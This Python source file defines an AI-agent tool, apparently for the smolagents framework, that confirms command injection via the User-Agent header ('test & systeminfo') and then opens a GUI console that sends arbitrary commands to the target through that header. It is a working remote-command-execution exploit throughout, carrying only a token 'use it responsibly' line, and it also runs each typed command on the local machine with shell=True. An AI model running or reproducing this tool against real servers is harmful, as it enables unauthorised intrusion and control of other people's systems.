#!/usr/bin/env python
# coding=utf-8

from smolagents import tool
import requests
import tkinter as tk
from tkinter import scrolledtext, messagebox
from tkinter import ttk
import threading
import subprocess
import sys

# Global reference to keep the window alive
_console_windows = []

@tool
def launch_command_injection_console(vulnerable_url: str) -> str:
    """
    The tool, after confirming via check_command_injection_via_useragent, verifies a vulnerability
    in the target URL and then opens an interactive console window with a dark theme to send commands.
    
    If the vulnerability is not found, the tool will return a message indicating that the system is not vulnerable.
    If the vulnerability is found, the tool will print a confirmation and launch the console.

    Args:
        vulnerable_url: The URL of the vulnerable web application (e.g., "http://example.com")
    """
    # First verify the vulnerability exists before opening the console
    verification_result = verify_vulnerability(vulnerable_url)
    if "VULNERABLE" not in verification_result:
        return f"The system does not appear to be vulnerable to command injection: {verification_result}"
    
    # Create and start the console thread
    console_thread = threading.Thread(target=create_console_window, args=(vulnerable_url,), daemon=True)
    console_thread.start()
    
    return "The host is vulnerable to command injection via User-Agent header. The console has been launched in a separate window. Please use it responsibly and ethically."

def verify_vulnerability(url):
    """Verify the target is actually vulnerable before proceeding"""
    try:
        test_payload = "test & systeminfo"
        headers = {'User-Agent': test_payload}
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if "OS Name:" in response.text:
            return "VULNERABLE - Command injection confirmed"
        else:
            return "Not vulnerable - No system information found in response"
    except Exception as e:
        return f"Error during vulnerability verification: {str(e)}"

def create_console_window(target_url):
    """Create a Tkinter window for the command console with a dark theme"""
    global _console_windows
    
    root = tk.Tk()
    _console_windows.append(root)  # Keep a reference to prevent garbage collection
    
    root.title(f"Command Injection Console - {target_url}")
    root.geometry("800x600")

    def on_closing():
        global _console_windows
        if tk.messagebox.askokcancel("Quit", "Do you want to close the console?"):
            _console_windows.remove(root)
            root.quit()
            root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_closing)

    # Dark theme colors
    bg_color = "#1e1e1e"
    text_color = "#e0e0e0"
    input_bg = "#2d2d2d"
    button_bg = "#cc0000"
    button_hover_bg = "#ff0000"
    button_fg = "white"
    warning_color = "#ff5050"

    root.configure(bg=bg_color)

    # Warning label
    warning_label = tk.Label(root, text="Remote Command Execution Console", fg=warning_color, bg=bg_color, font=("Arial", 12, "bold"))
    warning_label.pack(pady=10)

    # Target display
    url_frame = tk.Frame(root, bg=bg_color)
    url_frame.pack(fill="x", padx=10, pady=5)
    tk.Label(url_frame, text="Target:", bg=bg_color, fg=text_color).pack(side="left")
    tk.Label(url_frame, text=target_url, bg=bg_color, fg=text_color).pack(side="left", padx=5)

    # Command output display
    output_text = scrolledtext.ScrolledText(root, height=20, bg=input_bg, fg=text_color, insertbackground=text_color,
                                            selectbackground="#264f78", selectforeground=text_color, font=("Consolas", 10))
    output_text.pack(fill="both", expand=True, padx=10, pady=5)
    output_text.insert(tk.END, "# Command output will appear here\n\n")
    output_text.config(state="disabled")

    # Command input
    input_frame = tk.Frame(root, bg=bg_color)
    input_frame.pack(fill="x", padx=10, pady=10)
    tk.Label(input_frame, text="Command:", bg=bg_color, fg=text_color).pack(side="left")

    cmd_entry = tk.Entry(input_frame, bg=input_bg, fg=text_color, insertbackground=text_color, relief="flat",
                         highlightthickness=1, highlightcolor=button_bg, highlightbackground="#555555",
                         font=("Consolas", 10))
    cmd_entry.pack(side="left", fill="x", expand=True, padx=5)
    cmd_entry.focus()

    def send_command():
        cmd = cmd_entry.get().strip()
        if not cmd:
            return

        update_output(f"\n> {cmd}\n", output_text)
        cmd_entry.delete(0, tk.END)

        try:
            # Construct the payload for Windows command injection
            payload = f"test & {cmd}"
            headers = {'User-Agent': payload}

            response = requests.get(target_url, headers=headers, timeout=30)

            if "<pre>" in response.text and "</pre>" in response.text:
                pre_content = response.text.split("<pre>")[1].split("</pre>")[0]
                update_output(pre_content, output_text)
            else:
                update_output("Command sent, but no formatted output found.\n", output_text)

            # Execute the command locally while keeping the console open
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            def read_output():
                """Continuously read output without closing the window"""
                for line in iter(process.stdout.readline, ""):
                    update_output(line, output_text)
                for line in iter(process.stderr.readline, ""):
                    update_output(f"[ERROR] {line}", output_text)

            threading.Thread(target=read_output, daemon=True).start()

        except Exception as e:
            update_output(f"Error: {str(e)}\n", output_text)

    # Function to update output
    def update_output(text, output_widget):
        output_widget.config(state="normal")
        output_widget.insert(tk.END, text)
        output_widget.see(tk.END)
        output_widget.config(state="disabled")

    # Send button
    send_btn = tk.Button(input_frame, text="Send", command=send_command, bg=button_bg, fg=button_fg,
                         activebackground=button_hover_bg, activeforeground=button_fg, relief="flat", borderwidth=0,
                         padx=10, pady=5)
    send_btn.pack(side="right", padx=5)

    # Bind Enter key to send command
    cmd_entry.bind("<Return>", lambda event: send_command())

    # Ensure window stays on top
    root.attributes('-topmost', True)
    root.update()
    root.attributes('-topmost', False)

    root.mainloop()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
        verification_result = verify_vulnerability(target_url)
        if "VULNERABLE" in verification_result:
            print("The host is vulnerable! Opening console...")
            create_console_window(target_url)
        else:
            print(f"The system does not appear to be vulnerable: {verification_result}")
    else:
        print("Usage: python command_injection_console.py http://target-url")
